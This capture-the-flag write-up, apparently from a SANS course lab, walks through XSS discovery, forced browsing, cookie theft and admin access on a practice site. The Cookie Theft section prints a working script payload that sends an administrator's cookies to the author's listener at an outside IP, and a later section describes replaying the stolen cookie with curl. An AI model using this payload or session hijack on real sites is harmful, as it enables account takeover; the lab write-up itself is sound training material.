# Contact

* Challenge - Interact with the contact form on the http://www.issplaylist.com website. What is the flag returned as the reference number?
* Points - 3

First, I navigated to the website in the question. From there, I clicked "Contact" in the navbar at the top of the site to go to the contact form. After that, I submitted the form with expected input to get the flag. 

![Contact-1](https://github.com/user-attachments/assets/554573b6-cf11-4d39-a61c-cf6ef2dabf2f)

![Contact-2](https://github.com/user-attachments/assets/b3b72e0c-c945-4e90-9853-8fc67ccccce5)


# Vulnerability Discovery

* Challenge - Explore the Contact page on the http://www.issplaylist.com website to identify a vulnerability. Identify the type of vulnerability.
* Points - 5

First, I tried experiemnting with including a ' in the fields to get an SQL error. That did not work, as I got the same flag as the previous challenge. 

![Vulnerability-Discovery-1](https://github.com/user-attachments/assets/9e6c2acb-21c3-492b-bed5-c3d5f6de6aa3)

Then I tested for a different input based vulnerability by typing the hr HTML tag into each field of the contact form. I noticed the horizontal line from the hr HTML tag was displayed on the page. 

![Vulnerability-Discovery-2](https://github.com/user-attachments/assets/da88e1ea-a407-428c-8be7-c17f6c381823)

This means my input was reflected on the page. To confirm this, I viewed the page source, and used CTRL + F to look for my input, the hr HTML tag. The page source shows my input.  

![Vulnerability-Discovery-3](https://github.com/user-attachments/assets/5fcfa96a-4913-4b4c-9a2b-12733f806139)


# Forced Browsing

* Challenge - Identify the hidden page on the http://www.issplaylist.com server. Submit the page name (XXXXX.html).
* Points - 5

Typically, administrators pages are hidden from normal users. If a web server is misconfigured, you can just go straight to that hidden page with a forced browsing attack. From the question, we know the page name is five characters. With that knowledge, I find the answer.  

![Forced-Browsing-1](https://github.com/user-attachments/assets/3d6c7c7c-4629-4a5d-a35c-6871f3924e4f)


# Cookie Theft

* Challenge - Administrators for the http://www.issplaylist.com site frequently examine the contact page submissions using their browsers. Exploit the site vulnerability to steal cookie content from the administrator. What is the name of the cookie used to authenticate administrative users?
* Points - 5

From the Vulnerability Discovery challenge, I know the site is vulnerable to a specific input based attack. In Lab 4.4 from this course, SANS supplied to us a cookiecatcher PHP file. I started a PHP web server to listen for the cookie.

![Cookie-Theft-1](https://github.com/user-attachments/assets/651eb28a-e077-49d8-a4f3-647beb1cce5c)

After starting the listener on my attacker terminal, I went back to the browser. At the contact form, I put the following string in all of the fields then submited the form - ```<script>document.location='http://10.142.148.12:2222/?'+document.cookie;</script>```

![Cookie-Theft-2](https://github.com/user-attachments/assets/92775db5-f99f-4975-bead-2d2a6ef18727)

Going back to my attacker terminal, where the cookiecatcher PHP file is running, I can see the name of the stolen cookie. 

![Cookie-Theft-3](https://github.com/user-attachments/assets/96974117-4f82-4657-acc7-190582a682f6)


# Unauthorized Access

* Challenge - Use the stolen cookie to access the admin page. Submit the flag.
* Points - 5

Now that I have the cookie for admin from the Cookie Theft challenge, I can use curl with the -b argument to specify a token and return the content of that page as if I were logging in as an administrator. In my attacker terminal, I ran a curl command to get access to the admin page.

This returned the administrator page output. I scroll down to see the flag. 

![Unauthorized-Access-1](https://github.com/user-attachments/assets/32a2744e-00b6-4bba-a965-428df3bed6e4)

![Unauthorized-Access-2](https://github.com/user-attachments/assets/f342c0ec-3b34-451e-b4e8-10c872c88e94)
